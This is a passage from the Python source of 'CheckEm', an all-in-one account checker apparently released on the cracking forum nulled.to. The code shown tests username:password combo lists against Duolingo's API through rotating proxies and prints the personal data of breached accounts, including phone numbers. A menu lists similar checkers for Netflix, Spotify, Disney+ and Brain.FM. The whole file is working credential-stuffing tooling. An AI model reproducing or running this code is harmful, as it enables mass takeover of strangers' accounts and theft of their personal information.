                                'https://android-api-cf.duolingo.com/2017-06-30/users/{}/privacy-settings?fields=adsConfig%7Bunits%7D%2Cid%2CautoUpdatePreloadedCourses%2CbetaStatus%2Cbio%2CblockerUserIds%2CblockedUserIds%2CcoachOutfit%2Ccourses%7BauthorId%2CfromLanguage%2Cid%2ChealthEnabled%2ClearningLanguage%2Cpreload%2Ctitle%2Cxp%2Ccrowns%7D%2CcreationDate%2CcurrentCourseId%2Cemail%2CemailAnnouncement%2CemailFollow%2CemailPass%2CemailPromotion%2CemailStreakFreezeUsed%2CemailWeeklyProgressReport%2CemailWordOfTheDay%2Cexperiments%7Bandroid_alphabets_he_en%2Candroid_alphabets_hi_en%2Candroid_alphabets_yi_en%2Candroid_delight_schools_promo_se_v2%2Candroid_idle_animations_v2%2Candroid_news_tab%2Candroid_podcast_en_pt%2Candroid_prefetching_workmanager_v3%2Candroid_rlottie_v2%2Candroid_show_character_measurement_v2%2Cartemis_android_plus_ad_share%2Cchina_android_speaking_challenge_v4%2Cchina_android_turn_on_plus_1month_renew%2Cchina_android_words_list%2Cchina_oppo_turn_on_push_session_end%2Cchina_zh-HK_zh-CN_v1%2Cconnect_android_connect_contact%2Cconnect_android_fast_tpp_api_v2%2Cconnect_android_simplify_find_friends%2Cconnect_leaderboard_reactions_holdout%2Ccourses_fr_ja_v1%2Ccourses_it_de_v1%2Chacker_android_endow_skill_prog%2Chacker_android_redesign_select_v2%2Chacker_android_update_name%2Clearning_c_android_units%2Cmercury_android_acqui_survey_title_v2%2Cmercury_android_hdyhau_icons%2Cmidas_android_checklist_fade_v2%2Cmidas_android_design_parity%2Cmidas_android_health_empty_rv%2Cmidas_android_immersive_plus_v3%2Cmidas_android_mistakes_purchase_flow%2Cmidas_android_onboarding_notification%2Cmidas_android_plus_cancel_notif%2Cmidas_android_plus_video_pre_lesson_v3%2Cmidas_android_progress_quiz_banner_v2%2Cmidas_android_session_start_rv_copy%2Cmidas_android_stories_daily_goal_rv%2Cnurr_android_delay_ads_sdk_n_lessons_v2%2Cnurr_android_hints_callout_redesign_v2%2Cnurr_android_placement_warmup%2Cnurr_android_prior_proficiency_screen%2Cnurr_android_user_tuned_placement_v2%2Cnurr_dark_mode_redesign%2Copmar_android_grading_ribbon_v4%2Copmar_android_home_shop_icon_redesign%2Copmar_android_in_app_ratings%2Copmar_android_revamped_welcome_back_v2%2Copmar_android_whatsapp_opt_in_mx_br%2Copmar_surr_android_resurrected_criteria%2Cposeidon_android_axe_levelup_gems_bonus%2Cposeidon_android_gems_iap_v4%2Cretention_android_SE_anim_delay_v3%2Cretention_android_deeplink_intro_v2%2Cretention_android_goals_home_anim%2Cretention_android_restreak_titles_v2%2Cretention_android_se_stats_all_score%2Cretention_android_sf_empty_v1%2Cretention_android_streak_se_wknd%2Cretention_android_surr_lesson_onbd%2Cretention_android_two_d1_freezes%2Csharing_android_leaderboard_rank_up%2Csigma_android_legendary_partial_xp%2Csigma_android_legendary_ui_2%2Csigma_android_manual_purchase_restore%2Cspeak_android_sphinx_feedback%2Cstories_android_en_from_hi%2Cstories_android_en_from_ko%2Cstories_android_intro_callout_tier_1%2Cstories_en_from_vi_v2%2Ctsl_android_daily_goal_trigger%2Ctsl_android_delay_cta_mistakes%2Ctsl_android_lb_se_ten_xp%2Ctsl_android_prowess_indicators%2Cwriting_romaji_off_default%7D%2CfacebookId%2CfeedbackProperties%2CfromLanguage%2CgemsConfig%7Bgems%2CgemsPerSkill%2CuseGems%7D%2CglobalAmbassadorStatus%7Blevel%2Ctypes%7D%2CgoogleId%2ChasFacebookId%2ChasGoogleId%2ChasPlus%2ChasRecentActivity15%2Chealth%7BeligibleForFreeRefill%2ChealthEnabled%2CuseHealth%2Chearts%2CmaxHearts%2CsecondsPerHeartSegment%2CsecondsUntilNextHeartSegment%2CnextHeartEpochTimeMs%7D%2CinviteURL%2CjoinedClassroomIds%2ClearningLanguage%2Clingots%2Clocation%2Cname%2CobservedClassroomIds%2CoptionalFeatures%7Bid%2Cstatus%7D%2CpersistentNotifications%2CphoneNumber%2Cpicture%2CplusDiscounts%7BexpirationEpochTime%2CdiscountType%2CsecondsUntilExpiration%7D%2CpracticeReminderSettings%2CprivacySettings%2CpushAnnouncement%2CpushFollow%2CpushLeaderboards%2CpushPassed%2CpushPromotion%2CpushStreakFreezeUsed%2CpushStreakSaver%2CreferralInfo%7BhasReachedCap%2CnumBonusesReady%2CunconsumedInviteeIds%2CunconsumedInviteeName%2CinviterName%2CisEligibleForBonus%2CisEligibleForOffer%7D%2CrequiresParentalConsent%2CrewardBundles%7Bid%2CrewardBundleType%2Crewards%7Bid%2Cconsumed%2CitemId%2Ccurrency%2Camount%7D%7D%2Croles%2CshakeToReportEnabled%2CsmsAll%2CshopItems%7Bid%2CpurchaseDate%2CpurchasePrice%2Cquantity%2CsubscriptionInfo%7Bcurrency%2CexpectedExpiration%2CisFreeTrialPeriod%2CperiodLength%2Cprice%2Crenewer%2Crenewing%7D%2CwagerDay%2CexpectedExpirationDate%2CpurchaseId%2CremainingEffectDurationInSeconds%2CexpirationEpochTime%2CfamilyPlanInfo%7BownerId%2CsecondaryMembers%2CinviteToken%7D%7D%2Cstreak%2CstreakData%7Blength%2CstartTimestamp%2CupdatedTimestamp%2CchurnedStreakTimestamp%2CupdatedTimeZone%2CxpGoal%7D%2CsubscriptionConfigs%7BisInBillingRetryPeriod%2CvendorPurchaseId%2CproductId%2CpauseStart%2CpauseEnd%7D%2Ctimezone%2CtotalXp%2CtrackingProperties%2Cusername%2CxpGains%7Btime%2Cxp%2CeventType%2CskillId%7D%2CxpConfig%7BmaxSkillTestXp%2CmaxCheckpointTestXp%2CmaxPlacementTestXp%7D%2CxpGoal%2CzhTw%2CtimerBoostConfig%7BtimerBoosts%2CtimePerBoost%2ChasFreeTimerBoost%7D'.format(id),
                                proxy=proxy,
                                headers = {
                                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0',
                                    'Content-Type': 'application/json',
                                    "authorization": "Bearer {}".format(jwt),
                                    "x-amzn-trace-id": "User={}".format(id),
                                }, data = bytes(ujson.dumps({"DISABLE_PERSONALIZED_ADS":False,"DISABLE_THIRD_PARTY_TRACKING":False}), 'utf-8')
                            ) as resp:
                                #print(i,'55555')
                                try:
                                    a = await resp.text()
                                    a = ujson.loads(a)
                                
                                # w['_OUT_DUOLING_'].update('\n'+str(
                                #     i[0]+' | username={} | hasPlus={} | totalXP={} | gems={} | lingots={} | streak={} | followers={} | creationDate={} | facebookID={} | googleID={} | currentCourse={} | timezone={} | id={} | phoneNo={} | langs={} | parentControl={} | profilePic={}'.format(
                                #         a['username'], a['hasPlus'], a['totalXp'], a['gemsConfig']['gems'], a['lingots'], a['streak'], a['trackingProperties']['num_followers'], a['trackingProperties']['creation_date'], a['facebookId'], a['googleId'],
                                #         a['currentCourseId'], a['timezone'], a['id'], a['phoneNumber'], 'langs',
                                #         a['requiresParentalConsent'], a['picture']
                                #     )
                                # )+w['_OUT_DUOLING_'].get())
                                    
                                    w['_DUOLING_HITS_'].update(int(w['_DUOLING_HITS_'].get())+1)
                                    w['_OUT_DUOLING_'].print(
                                        i[0]+' | username={} | hasPlus={} | totalXP={} | gems={} | lingots={} | streak={} | followers={} | creationDate={} | currentCourse={} | timezone={} | id={} | phoneNo={} | langs={} | parentControl={} | profilePic={}'.format(
                                            a['username'], a['hasPlus'], a['totalXp'], a['gemsConfig']['gems'], a['lingots'], a['streak'], a['trackingProperties']['num_followers'], a['trackingProperties']['creation_date'],
                                            a['currentCourseId'], a['timezone'], a['id'], a['phoneNumber'], 'langs',
                                            a['requiresParentalConsent'], a['picture']
                                        )
                                    )
                                except:
                                    print('seconderr', i)
                                    return
                except aiohttp.ServerConnectionError:
                    print('serverr')
                    w['_DUOLING_ERROR_'].update(int(w['_DUOLING_ERROR_'].get())+1)
                    w['_FALSE_DUOLING_'].update('Bad account: {}:{} - Error: Server Error'.format(i[0], i[1]))
                    return
                except asyncio.TimeoutError:
                    print('timeouterr')
                    w['_DUOLING_ERROR_'].update(int(w['_DUOLING_ERROR_'].get())+1)
                    w['_FALSE_DUOLING_'].update('Bad account: {}:{} - Error: Timeout Error'.format(i[0], i[1]))
                    return
                except aiohttp.ClientHttpProxyError:
                    print('httproxer')
                    duoling_bad_prox.append(proxy)
                    duoling_retry.append(i)
                    w['_DUOLING_ERROR_'].update(int(w['_DUOLING_ERROR_'].get())+1)
                    w['_FALSE_DUOLING_'].update('Bad account: {}:{} - Error: Proxy Error'.format(i[0], i[1]))
                    return
                except aiohttp.ClientSSLError:
                    print('sslerr1')
                    w['_DUOLING_ERROR_'].update(int(w['_DUOLING_ERROR_'].get())+1)
                    w['_FALSE_DUOLING_'].update('Bad account: {}:{} - Error: SSL Error'.format(i[0], i[1]))
                    return
                except aiohttp.ClientError as e:

                    print('err1', e)
                    w['_DUOLING_ERROR_'].update(int(w['_DUOLING_ERROR_'].get())+1)
                    w['_FALSE_DUOLING_'].update('Bad account: {}:{} - Error: {}'.format(i[0], i[1], str(e).replace('android-api-cf.duolingo.com','')))
                    return
                except:
                    print('idkerror')
                    return

            async def async_check_DUOLING():
                async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar(), timeout = aiohttp.ClientTimeout(v['_DUOLING_TIME_'])) as session:

                    try:
                        with open(v['_DUOLING_COMBO_PATH_']) as f:
                            DUOLING_continue_check = True
                            while DUOLING_continue_check:
                                tasks = []
                                for k in range(v['_DUOLING_CHUNKS_']):
                                    i = f.readline()[:-1].split(':', 1)
                                    #i = j[1][0].split(':', 1) 
                                    
                                    if v['_DUOLING_USE_PROX_']:
                                        b=proxy_list.sample()[0].tolist()[0]
                                        prox = protocol + '://' + b
                                        if prox in duoling_bad_prox:
                                            b=proxy_list.sample()[0].tolist()[0]
                                            prox = protocol + '://' + b
                                            if prox in duoling_bad_prox:
                                                b=proxy_list.sample()[0].tolist()[0]
                                                prox = protocol + '://' + b
                                                if prox in duoling_bad_prox:
                                                    b=proxy_list.sample()[0].tolist()[0]
                                                    prox = protocol + '://' + b
                                    else: prox = None
                                        #if a in DUOLING_bad_prox:
                                    if len(i) == 2:
                                        tasks.append(asyncio.ensure_future(post_DUOLING(session, l()+d()+d()+l()+d()+d()+l()+d()+d()+d()+d()+l()+d()+d()+d()+l()+d()+d()+d()+d()+d()+d()+d()+d()+d()+d()+l()+d()+l()+l()+l()+l(), i, prox)))
                                    if i == ['']:
                                        DUOLING_continue_check = False
                                        #await brainfm_btns()
                                total = await asyncio.gather(*tasks)
                    except Exception as e:
                        print('ssdgf88',e)
                async def DUOLING_btns():
                    print('checked all')
                    w['_FALSE_DUOLING_'].update(
                        'Unchecked due to proxy errors:\n'+'\n'.join(['{}:{}'.format(x[0], x[1]) for x in duoling_retry])
                    )
                    w['_START_DUOLING_'].update(disabled=False)
                    w['_STOP_DUOLING_'].update(disabled=True)
                    loop.call_soon_threadsafe(loop.stop)
                    t.join()
                await DUOLING_btns()
                #     for k in df:
                #         tasks = []
                #         for j in k.iterrows():
                #             i = j[1][0].split(':', 1)
                            
                #             if len(i) != 2:
                #                 print('bad line:', j)
                #                 continue
                            
                #             if is_use_prox:
                #                 b=proxy_list.sample()[0].tolist()[0]
                #                 prox = protocol + '://' + b
                #                 if prox in duoling_bad_prox:
                #                     b=proxy_list.sample()[0].tolist()[0]
                #                     prox = protocol + '://' + b
                #                     if prox in duoling_bad_prox:
                #                         b=proxy_list.sample()[0].tolist()[0]
                #                         prox = protocol + '://' + b
                #                         if prox in duoling_bad_prox:
                #                             b=proxy_list.sample()[0].tolist()[0]
                #                             prox = protocol + '://' + b
                #             else: prox = None

                #             tasks.append(asyncio.ensure_future(post_DUOLING(session, l()+d()+d()+l()+d()+d()+l()+d()+d()+d()+d()+l()+d()+d()+d()+l()+d()+d()+d()+d()+d()+d()+d()+d()+d()+d()+l()+d()+l()+l()+l()+l(), i, prox)))
                #         total = await asyncio.gather(*tasks)
                # async def DUOLING_btns():
                #     print('checked all')
                #     w['_FALSE_DUOLING_'].update(
                #         'Unchecked due to proxy errors:\n'+'\n'.join(['{}:{}'.format(x[0], x[1]) for x in duoling_retry])
                #     )
                #     w['_START_DUOLING_'].update(disabled=False)
                #     w['_STOP_DUOLING_'].update(disabled=True)
                #     loop.call_soon_threadsafe(loop.stop)
                #     t.join()
                    
                # await DUOLING_btns()

            # if len(df)<=v['_DUOLING_CHUNKS_']:
            #     asyncio.run_coroutine_threadsafe(async_check_DUOLING([df], proxy_list, protocol, v['_DUOLING_USE_PROX_']), loop)
            # else:
            asyncio.run_coroutine_threadsafe(async_check_DUOLING(), loop)

        if e == '_STOP_DUOLING_':
            loop.call_soon_threadsafe(loop.stop)
            t.join()
            w['_START_DUOLING_'].update(disabled=False)
            w['_STOP_DUOLING_'].update(disabled=True)
        if e == '_M_': web('https://www.nulled.to/user/4103370-m3gz')
        if e == '_CE_': web('https://www.nulled.to/topic/1387687-nulledto-coding-event/')
        if e == '_R_': web('https://www.nulled.to/topic/1308515-list-of-releases/')
#endregion

    w.close()

lay_buttons = [
    [sg.Frame('',
        [[
            sg.B('', key='Duolingo', image_filename='./duolingo.png', button_color=(sg.theme_background_color(),sg.theme_background_color()), border_width=0),
            sg.B('', key='Brain.FM', image_filename='./brainfm.png', button_color=(sg.theme_background_color(),sg.theme_background_color()), border_width=0),
            sg.B('', key='Spotify', image_filename='./spotify.png', button_color=(sg.theme_background_color(),sg.theme_background_color()), border_width=0),
        ],
        #[sg.T()],
        [
            sg.B('', key='Disney+', image_filename='./disney.png', button_color=(sg.theme_background_color(),sg.theme_background_color()), border_width=0),
            sg.B('', key='Netflix', image_filename='./netflix.png', button_color=(sg.theme_background_color(),sg.theme_background_color()), border_width=0),

        ]], border_width=0, element_justification='c'
    )],
    #[sg.Frame('Streaming', [[sg.B('Disney+'), sg.B('Porn'), sg.B('IpVanish')]])],
    #[sg.T()],
    [sg.Frame('', [[sg.B('Free Proxies', key='_PROXY_PAGE_', size=(14,1)), sg.B('Money Glitch', key='_RICK_', size=(14,1)), sg.B('About', size=(14,1), key='_ABOUT_PAGE_'),
            #sg.B('Quit', size=(12,1))
    ]], border_width=0)],
]

w_choose = sg.Window('CheckEm - AIO Checker By M3GZ', lay_buttons, element_justification='c', font=font, margins=(30,30), element_padding=10)
while True:
    e,v = w_choose.read()
    if e in (sg.WIN_CLOSED, 'Quit'): break
    elif e != '_RICK_':
        w_choose.close()
        create_checker_window(e)
    elif e == '_RICK_':
        sg.popup('tbd')
w_choose.close()
#create_checker_window('Netflix')
